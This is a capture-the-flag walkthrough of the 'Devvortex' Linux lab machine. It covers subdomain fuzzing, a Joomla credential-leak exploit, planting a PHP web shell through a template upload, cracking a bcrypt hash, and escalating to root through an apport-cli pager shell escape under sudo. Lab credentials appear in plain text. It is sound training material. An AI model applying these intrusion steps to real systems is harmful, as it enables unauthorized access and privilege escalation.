---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Devvortex
Linux machine

## Foothold

Do not forget to update the `/etc/hosts` file.

### Nmap port scan

```shell
nmap -p- -sV -v 10.10.11.242
```

### Website enumeration and exploit
Scan subdomains:
```shell
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154
```

We find the `dev` subdomain (http://dev.devvortex.htb).

Find out the service -> *Wappalyzer* says it’s **Joomla**. Optionally use [joomscan](https://github.com/OWASP/joomscan) to get more info/version.

Find an [exploit](https://www.exploit-db.com/exploits/51334) which gives us returns credentials to DB.  
We can log in with the credentials (`lewis:P4ntherg0t1n5r3c0n##`).

## User
Add file to an existing template in system. Path: *site-templates* -> *existing template edit* -> *new file* -> *upload php shell*. We can use the [powny shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php).

Once we have a working shell, access the page its on. To get an interactive shell we use python shell (the php shell doesn't allow input and can be problematic).

From the python shell, access mysql using the retrieved credentials from the first exploit.  
Get the hash from `joomla db` -> `users`.

Crack the found hash (*bcrypt*) using *hashcat*:
```shell
hashcat -a 0 -m 3200 hash.txt rockyou.txt
```

Found credentials: `logan:tequieromucho`.

Log in using ssh and the new credentials -> user flag.

## Root
Check for sudo privileges:
```shell
sudo -l
```

Check the `apport-cli` version and help page.  
We find an [exploit](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb), which uses a less/interactive shell vulnerability in which you can run a shell.

To generate a report you can use to exploit the apport use:
```
sleep 10 &
killall -SIGSEGV sleep
```

Use the apport-cli
```shell
sudo apport-cli -c /var/crash/_user_bin_sleep_1000.crash
```

Wait fo the prompt -> use the `v` option -> wait -> type `!id` -> you are root.
